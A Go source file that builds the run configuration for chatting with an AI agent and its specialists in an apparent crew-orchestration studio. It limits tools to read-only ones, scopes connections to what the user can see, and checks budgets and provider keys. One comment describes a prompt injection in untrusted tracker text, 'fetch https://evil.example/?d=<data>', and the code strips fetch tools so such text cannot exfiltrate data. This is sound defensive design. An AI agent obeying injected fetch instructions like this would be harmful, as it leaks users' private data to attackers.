package chat

import (
	"context"
	"errors"
	"fmt"
	"slices"
	"strings"

	"crewstudio/internal/auth"
	"crewstudio/internal/launch"
	"crewstudio/internal/model"
	"crewstudio/internal/runspec"
	"crewstudio/internal/store"
)

// Agent chat (docs/agent-chat-design.md): a person talks to one agent. Each turn is one chat run whose spec holds
// the agent first and the specialists it may ask after it; the runner gives the agent CrewAI's coworker tools for
// them. The agent may propose a work order on one of the crews it may start, which the person confirms as usual.
//
// What the agents may do is fixed here: each keeps only those of its own tools that the catalog says only read and
// whose needs the turn meets, and the proposing counterparts of its changing tools (chatToolsFor;
// docs/agent-chat-handoffs-design.md, section 7), specialists cannot hand work on, and only specialists, crews and
// connections the person can see are included.

// StartCrewWorkOrderTool proposes a work order on one of the crews the agent may start.
const StartCrewWorkOrderTool = "start_crew_work_order"

// AskLeadTool lets a specialist ask the lead a question inside the run (docs/agent-chat-handoffs-design.md, section 6).
// The runner answers it with a one-shot call of the lead (its lead desk); in a hand-off whose agent allows questions the
// lead desk may bring the question to the person. It only talks, so it is not in the catalog. Keep in step with
// ASK_LEAD_KEY in studio_runner/lead_desk.py.
const AskLeadTool = "ask_lead"

// maxSpecialistIter bounds a specialist's steps in one chat turn. Someone is waiting for the reply: in a live trial a
// research specialist with more steps made 24 web calls and took over two minutes. Keep in step with
// MAX_SPECIALIST_ITER in studio_runner/agent_chat.py.
const maxSpecialistIter = 3

// AgentTools are the chat tools only agent chat gives: the lead's crew run and hand-off cards, and the counterparts of
// changing tools (counterparts.go).
var AgentTools = append([]Tool{
	{Key: StartCrewWorkOrderTool, Proposes: TypeStartWorkOrder, Needs: []string{auth.WorkOrdersCreate}},
	// Given to the lead when the agent's hand-offs are on; the card is all it makes (docs/agent-chat-handoffs-design.md)
	{Key: StartHandoffTool, Proposes: TypeStartHandoff},
}, counterpartTools...)

// StartAgentConversation starts a conversation with an agent with its first message.
func (s *Service) StartAgentConversation(ctx context.Context, p *auth.Principal, agentID, content string, files ...model.Attachment) (Turn, error) {
	if err := checkChatter(p); err != nil {
		return Turn{}, err
	}
	text, err := model.NormalizeChatMessage(content)
	if err != nil {
		return Turn{}, err
	}
	agent, err := s.visibleAgent(ctx, p, agentID)
	if err != nil {
		return Turn{}, err
	}
	base, settings, err := s.agentBase(ctx, p, agent.ID)
	if err != nil {
		return Turn{}, err
	}
	conv, err := s.store.CreateAgentConversation(ctx, agent.ID, p.UserID, model.ChatTitle(text))
	if err != nil {
		return Turn{}, err
	}
	turn, err := s.start(ctx, p, conv, base, settings, text, files)
	if err != nil {
		// As for crews: a turn that did not start leaves no empty conversation behind
		if derr := s.store.DeleteConversation(ctx, conv.ID); derr != nil {
			return Turn{}, errors.Join(err, derr)
		}
	}
	return turn, err
}

func (s *Service) visibleAgent(ctx context.Context, p *auth.Principal, agentID string) (model.Agent, error) {
	agent, err := s.store.GetAgent(ctx, agentID)
	if err == nil && !p.SeesAreas(agent.AreaIDs) {
		err = store.ErrNotFound
	}
	return agent, err
}

// agentBase checks the agent's chat settings and freezes it with the specialists and crews the person may use.
// The settings it returns carry the agent's budgets in the shape crew chat uses.
func (s *Service) agentBase(ctx context.Context, p *auth.Principal, agentID string) (model.RunSpec, model.ChatSettings, error) {
	settings, err := s.store.AgentChatSettings(ctx, agentID)
	if err != nil {
		return model.RunSpec{}, model.ChatSettings{}, err
	}
	budgets := model.ChatSettings{Enabled: settings.Enabled, LLMID: settings.LLMID, DailyBudgetUSD: settings.DailyBudgetUSD,
		PersonDailyBudgetUSD: settings.PersonDailyBudgetUSD}
	if !settings.Enabled {
		return model.RunSpec{}, budgets, agentProblem("Chat is turned off for this agent.")
	}
	lib, err := s.launcher.Library(ctx)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	crews, err := s.agentCrews(ctx, p, settings.CrewIDs)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	lead, ok := lib.Agents[agentID]
	if !ok {
		return model.RunSpec{}, budgets, agentProblem("The agent no longer exists.")
	}
	conns, err := s.agentConnections(ctx, p, lead, settings.ConnectionIDs)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	mcpTools, err := s.chatMCPTools(ctx, conns)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	met := needsMet(conns)
	// The lead proposes what its own changing tools would change; specialists only when the builder allows it
	tools := chatToolsFor(lead.Tools, lib.Tools, met, p)
	if len(crews) > 0 && p.Can(auth.WorkOrdersCreate) {
		tools = append(tools, StartCrewWorkOrderTool)
	} else {
		crews = []model.ChatCrewOption{}
	}
	if settings.HandoffsEnabled {
		tools = append(tools, StartHandoffTool)
	}
	lead, leadLLM, err := frontDesk(lib, agentID, settings.LLMID, tools)
	var problems *launch.ProblemsError
	if errors.As(err, &problems) {
		return model.RunSpec{}, budgets, agentProblem(problems.Details...)
	}
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	var proposer *auth.Principal
	if settings.SpecialistsMayPropose {
		proposer = p
	}
	specialists, err := chatSpecialists(lib, p, lead, settings.SpecialistIDs, met, proposer)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	if len(mcpTools) > 0 {
		// What an MCP server returns is untrusted like tracker and KM2 text
		lead, specialists = withoutFetch(lead, specialists)
	} else {
		lead, specialists = withoutFetchBesidePrivateReads(lead, specialists, lib.Tools)
	}
	missing, err := s.launcher.MissingProviderKeys(turnModels(lib, leadLLM, specialists)...)
	if err != nil {
		return model.RunSpec{}, budgets, err
	}
	stops := append(toolProblems(lib, append([]model.Agent{lead}, specialists...)), keyProblems(missing, lead, leadLLM, specialists, lib.LLMs)...)
	if len(stops) > 0 {
		return model.RunSpec{}, budgets, agentProblem(stops...)
	}
	spec := agentSpec(lib, lead, leadLLM, specialists, crews, settings)
	spec.Chat.Connections = append(usedConnections(conns, spec.Agents, lib.Tools), mcpConnections(conns, mcpTools)...)
	spec.Chat.MCPTools = mcpTools
	return spec, budgets, nil
}

// turnModels are the models a turn's agents call: the lead's and each specialist's.
func turnModels(lib runspec.Library, leadLLM model.LLM, specialists []model.Agent) []string {
	models := []string{leadLLM.Model}
	for _, a := range specialists {
		models = append(models, lib.LLMs[*a.LLMID].Model)
	}
	return models
}

// keyProblems names the lead and each specialist whose model's provider key is not set (missing maps a model to the
// key it lacks). Their calls would fail to authenticate, and a failed specialist can leave the lead answering without
// it, so the turn is refused before it starts; a crew run's check only warns.
func keyProblems(missing map[string]string, lead model.Agent, leadLLM model.LLM, specialists []model.Agent, llms map[string]model.LLM) []string {
	var problems []string
	add := func(who string, llm model.LLM) {
		if env := missing[llm.Model]; env != "" {
			problems = append(problems, keyProblem(who, llm, env))
		}
	}
	add(fmt.Sprintf("The agent %q", lead.Name), leadLLM)
	for _, a := range specialists {
		add(fmt.Sprintf("The specialist %q", a.Name), llms[*a.LLMID])
	}
	return problems
}

// keyProblem says who uses a model whose provider key env is not set.
func keyProblem(who string, llm model.LLM, env string) string {
	return fmt.Sprintf("%s uses %s (%s), whose provider key %s is not set in the provider env file; whoever runs Crew Studio can add it.",
		who, llm.Name, llm.Model, env)
}

func agentProblem(details ...string) error {
	return &launch.ProblemsError{Message: "Chat with this agent is not possible right now.", Details: details}
}

// agentSpec is the frozen run spec of an agent-chat turn: the lead first, its specialists after it, no tasks, and a
// crew that only names the run (it has no state, notes or connections).
func agentSpec(lib runspec.Library, lead model.Agent, leadLLM model.LLM, specialists []model.Agent, crews []model.ChatCrewOption,
	settings model.AgentChatSettings) model.RunSpec {
	// With specialists the lead gets CrewAI's coworker tools; they never do (see chatSpecialists)
	lead.AllowDelegation = len(specialists) > 0
	agents := append([]model.Agent{lead}, specialists...)
	ids, llms := make([]string, 0, len(agents)), []model.LLM{leadLLM}
	for _, a := range agents {
		ids = append(ids, a.ID)
		if !slices.ContainsFunc(llms, func(l model.LLM) bool { return l.ID == *a.LLMID }) {
			llms = append(llms, lib.LLMs[*a.LLMID])
		}
	}
	refs := make([]model.ChatSpecialist, 0, len(specialists))
	for _, a := range specialists {
		refs = append(refs, model.ChatSpecialist{AgentID: a.ID, Name: a.Name, Role: a.Role})
	}
	crew := model.Crew{Name: lead.Name, Process: "sequential", AgentIDs: ids, TaskIDs: []string{}, Inputs: []model.CrewInput{},
		AreaIDs: slices.Clone(lead.AreaIDs)}
	return model.RunSpec{
		Crew: crew, Agents: agents, Tasks: []model.Task{}, LLMs: llms, Pricing: slices.Clone(lib.Pricing), Settings: lib.Settings,
		Inputs: map[string]string{}, BudgetUSD: settings.DailyBudgetUSD,
		Chat: &model.ChatSpec{Agent: &model.ChatAgentSpec{AgentID: lead.ID, Specialists: refs, Crews: crews}},
	}
}

// chatToolsFor keeps the agent's own tools that agent chat allows, in the agent's order: those the catalog says only
// read and whose needs are all met. A tool that changes things is replaced by its proposing counterpart (Counterparts)
// when proposer is set (the person chatting, when this agent may propose), its needs are met and the person holds what
// the counterpart's card needs. Tools needing a crew or a schedule (an agent has neither), other changing tools and tools
// the catalog does not know are dropped. The runner applies the same rule to the spec.
func chatToolsFor(tools []string, catalog map[string]model.Tool, met map[string]bool, proposer *auth.Principal) []string {
	out := []string{}
	add := func(key string) {
		if !slices.Contains(out, key) {
			out = append(out, key)
		}
	}
	for _, key := range tools {
		tool, known := catalog[key]
		if !known || slices.ContainsFunc(tool.Needs, func(need string) bool { return !met[need] }) {
			continue
		}
		switch tool.Effect {
		case model.EffectReads:
			add(key)
		case model.EffectChanges:
			if c, ok := counterpartOf(key); ok && proposer != nil && holdsAll(proposer, c.Needs) {
				add(c.Key)
			}
		}
	}
	return out
}

// needsMet are the needs the turn's connections meet: "tracker" with a Jira, Linear or KM2 issues connection, "km2"
// with a KM2 one. Crew state and schedules are never met in agent chat.
func needsMet(conns []model.RunConnection) map[string]bool {
	met := map[string]bool{}
	for _, c := range conns {
		if need := model.ChatNeedOf(c.Kind); need != "" {
			met[need] = true
		}
	}
	return met
}

// agentConnections are the agent's listed connections a turn of p's may read through: enabled, of a kind its read
// tools use, and sharing an area with both p and the agent. Anything else on the list is left out.
func (s *Service) agentConnections(ctx context.Context, p *auth.Principal, agent model.Agent, ids []string) ([]model.RunConnection, error) {
	out := []model.RunConnection{}
	for _, id := range ids {
		c, err := s.store.GetConnection(ctx, id)
		if errors.Is(err, store.ErrNotFound) {
			continue
		}
		if err != nil {
			return nil, err
		}
		if c.Enabled && model.ChatNeedOf(c.Kind) != "" && p.SeesAreas(c.AreaIDs) && sharesArea(c.AreaIDs, agent.AreaIDs) {
			out = append(out, model.RunConnection{ID: c.ID, Name: c.Name, Kind: c.Kind})
		}
	}
	return out, nil
}

// fetchTools reach a URL the agent chooses, so text it read could be sent out through them.
var fetchTools = []string{"scrape_website"}

// withoutFetchBesidePrivateReads drops the fetch tools from every agent of a turn in which any agent reads a tracker or
// KM2. That text is untrusted: an injected "fetch https://evil.example/?d=<data>" must find no tool to do it with.
// Google Search stays, since its queries go to Google, not to a URL the text chooses. The agents passed in are left as
// they are; changed copies are returned.
func withoutFetchBesidePrivateReads(lead model.Agent, specialists []model.Agent, catalog map[string]model.Tool) (model.Agent, []model.Agent) {
	all := append([]model.Agent{lead}, specialists...)
	private := slices.ContainsFunc(all, func(a model.Agent) bool {
		return slices.ContainsFunc(a.Tools, func(key string) bool {
			needs := catalog[key].Needs
			return slices.Contains(needs, model.NeedTracker) || slices.Contains(needs, model.NeedKM2)
		})
	})
	if !private {
		return lead, specialists
	}
	return withoutFetch(lead, specialists)
}

// withoutFetch drops the fetch tools from the lead and every specialist (changed copies are returned).
func withoutFetch(lead model.Agent, specialists []model.Agent) (model.Agent, []model.Agent) {
	strip := func(a model.Agent) model.Agent {
		a.Tools = slices.DeleteFunc(slices.Clone(a.Tools), func(key string) bool { return slices.Contains(fetchTools, key) })
		return a
	}
	out := make([]model.Agent, 0, len(specialists))
	for _, a := range specialists {
		out = append(out, strip(a))
	}
	return strip(lead), out
}

// usedConnections are the connections some agent of the turn has a tool for; only these are frozen into its spec, so
// the run token reaches no connection the turn has no use for. KM2 reads cannot choose a connection, so at most one KM2
// connection is kept (the first listed); saving the agent's settings refuses a second one.
func usedConnections(conns []model.RunConnection, agents []model.Agent, catalog map[string]model.Tool) []model.RunConnection {
	used := map[string]bool{}
	for _, a := range agents {
		for _, key := range a.Tools {
			for _, need := range toolNeedsOf(key, catalog) {
				used[need] = true
			}
		}
	}
	out := []model.RunConnection{}
	hasKM2 := false
	for _, c := range conns {
		need := model.ChatNeedOf(c.Kind)
		if !used[need] || (need == model.NeedKM2 && hasKM2) {
			continue
		}
		hasKM2 = hasKM2 || need == model.NeedKM2
		out = append(out, c)
	}
	return out
}

// chatMCPTools are the reading tools of the turn's MCP connections (slice 3e): enabled and marked Reads by an
// administrator, at most model.MaxChatMCPTools over all of them. Only the lead is given them; each call goes through
// Studio, which checks it against this frozen list and the tool's settings at that moment.
func (s *Service) chatMCPTools(ctx context.Context, conns []model.RunConnection) ([]model.ChatMCPTool, error) {
	tools, err := s.store.ChatMCPTools(ctx, conns)
	if err != nil {
		return nil, err
	}
	if len(tools) > model.MaxChatMCPTools {
		tools = tools[:model.MaxChatMCPTools]
	}
	return tools, nil
}

// mcpConnections are the MCP connections at least one frozen tool belongs to, in the order listed.
func mcpConnections(conns []model.RunConnection, tools []model.ChatMCPTool) []model.RunConnection {
	out := []model.RunConnection{}
	for _, c := range conns {
		if c.Kind == model.KindMCP && slices.ContainsFunc(tools, func(t model.ChatMCPTool) bool { return t.ConnectionID == c.ID }) {
			out = append(out, c)
		}
	}
	return out
}

// toolProblems lists what stops the agents' own tools from working, as a crew run checks it: a tool that needs a
// key the server lacks, or a search model without a price (searches would not be counted against the budget).
func toolProblems(lib runspec.Library, agents []model.Agent) []string {
	var problems []string
	searches := false
	for _, a := range agents {
		for _, key := range a.Tools {
			if key == AskLeadTool || slices.ContainsFunc(AgentTools, func(t Tool) bool { return t.Key == key }) {
				continue // the proposal tools and Ask the lead are Studio's own
			}
			tool, ok := lib.Tools[key]
			switch {
			case !ok:
				problems = append(problems, fmt.Sprintf("Agent %q uses unknown tool %q.", a.Name, key))
			case !tool.Available:
				problems = append(problems, fmt.Sprintf("Agent %q uses tool %q, which needs %s set in the provider .env file.",
					a.Name, key, strings.Join(tool.RequiresEnv, ", ")))
			}
			searches = searches || key == "google_search"
		}
	}
	if searches && runspec.MatchPrice(lib.Settings.SearchModel, lib.Pricing) == nil {
		problems = append(problems, fmt.Sprintf("There is no price for the search model %q; add one on the Pricing page.", lib.Settings.SearchModel))
	}
	return problems
}

// chatSpecialists freezes the specialists the person can see, each with its own model and allowed tools (as for the
// lead, with the needs the turn meets; the counterparts of its changing tools only when proposer is set) plus Ask the
// lead, and at most maxSpecialistIter steps. They cannot hand work on. CrewAI picks a coworker by role, so a role that
// repeats is left out.
func chatSpecialists(lib runspec.Library, p *auth.Principal, lead model.Agent, ids []string, met map[string]bool,
	proposer *auth.Principal) ([]model.Agent, error) {
	roles := []string{model.ChatRoleKey(lead.Role)}
	out := []model.Agent{}
	for _, id := range ids {
		a, ok := lib.Agents[id]
		if !ok || !p.SeesAreas(a.AreaIDs) || slices.Contains(roles, model.ChatRoleKey(a.Role)) {
			continue
		}
		if a.LLMID == nil {
			return nil, agentProblem(fmt.Sprintf("The specialist %q has no LLM; give it one or take it off the list.", a.Name))
		}
		llm, ok := lib.LLMs[*a.LLMID]
		if !ok || runspec.MatchPrice(llm.Model, lib.Pricing) == nil {
			return nil, agentProblem(fmt.Sprintf("The specialist %q has no priced LLM; add a price on the Pricing page.", a.Name))
		}
		roles = append(roles, model.ChatRoleKey(a.Role))
		// A specialist may ask the lead (slice 3c); the runner gives it Ask the lead only when this lists it
		a.Tools = append(chatToolsFor(a.Tools, lib.Tools, met, proposer), AskLeadTool)
		a.AllowDelegation = false
		a.MaxIter = min(max(a.MaxIter, 1), maxSpecialistIter)
		out = append(out, a)
	}
	return out, nil
}

// agentCrews lists the crews the agent may start that the person can see, with their inputs.
func (s *Service) agentCrews(ctx context.Context, p *auth.Principal, ids []string) ([]model.ChatCrewOption, error) {
	out := []model.ChatCrewOption{}
	for _, id := range ids {
		crew, err := s.visibleCrew(ctx, p, id)
		if errors.Is(err, store.ErrNotFound) {
			continue
		}
		if err != nil {
			return nil, err
		}
		out = append(out, model.ChatCrewOption{ID: crew.ID, Name: crew.Name, Description: crew.Description, Inputs: model.ChatInputs(crew.Inputs)})
	}
	return out, nil
}
